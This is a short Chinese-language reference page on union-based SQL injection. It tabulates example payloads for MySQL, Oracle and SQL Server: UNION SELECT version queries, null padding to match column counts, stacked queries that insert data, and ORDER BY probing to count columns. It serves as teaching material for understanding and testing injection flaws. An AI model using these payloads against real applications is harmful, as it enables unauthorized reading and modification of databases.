### 联合查询注入 {docsify-ignore-all}

基于联合的SQL注入允许攻击者通过扩展原始查询返回的结果来从数据库中提取信息。 仅当原始/新查询具有相同结构（列的数量和数据类型）时，才能使用联合运算符。

#### MySQL

| 描述   |      语句     |  
|----------|:-------------:|
| 联合   |      SELECT "mysql" UNION SELECT @@version     |  
| 联合子查询   |      SELECT "mysql" UNION (select @@version)     |  
| 联合null <br />注意：如果原始查询返回多个列，则添加null以等于列数   |      SELECT "mysql","test" UNION SELECT @@version,null     |  
| 堆叠查询 <br />注意：堆叠查询并不总是返回结果，因此它们最适合用于更新/修改数据的注入。   |      SELECT "mysql"; INSERT INTO 'docs' ('content') VALUES ((SELECT @@version))     |  


#### Oracle

| 描述   |      语句     |  
|----------|:-------------:|
| 联合   |      SELECT user FROM dual UNION SELECT * FROM v$version    | 
| 联合子查询   |      SELECT user FROM dual UNION (SELECT * FROM v$version)     |  
| 联合null <br />注意：如果原始查询返回多个列，则添加null以等于列数  |      SELECT user,dummy FROM dual UNION (SELECT banner,null FROM v$version)     |  



#### SQL Server

| 描述   |      语句     |  
|----------|:-------------:|
| 联合   |      	SELECT user UNION SELECT @@version     |  
| 联合子查询   |      	SELECT user UNION (SELECT @@version)     |  
| 联合null<br  /> 注意：如果原始查询返回多个列，则添加null以等于列数   |      SELECT user,system_user UNION (SELECT @@version,null)     |  
| 联合null二进制减半 <br />注意：此查询用于检测列数。[numberOfColumns]大于列数则返回错误，从而找到表中列的数目。   |      SELECT * FROM yourtable ORDER BY [numberOfColumns]     |  
| 堆积式查询 <br />注意：堆积式查询并不总是返回结果，因此它们最适合用于更新/修改数据的注入。   |      SELECT @@version; SELECT @@version --     |  


